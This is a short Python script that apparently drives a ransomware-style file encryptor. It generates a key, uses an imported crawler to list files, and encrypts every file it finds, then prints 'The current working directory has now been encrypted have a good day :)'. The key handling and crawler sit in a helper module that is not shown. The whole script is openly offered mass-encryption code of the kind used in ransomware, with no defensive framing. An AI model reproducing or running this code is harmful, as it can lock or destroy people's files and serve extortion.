import main_functions as ed
import os

clear = lambda: os.system('cls')

clear()
ed.create_key()

filtered_list = list(filter(None, ed.os_crawler()))
final_list = ed.flatten(filtered_list)

print("Now Ecrypting current working directory.....")
print("-------------------------------------------")
for extension in range(len(final_list)):
    ed.encrypt(final_list[extension], ed.load_key())
    if extension < 1:
        print("1 file done.")
    else:
        print(extension+1, "files done.")

clear()

print("The current working directory has now been encrypted have a good day :)")
clear()

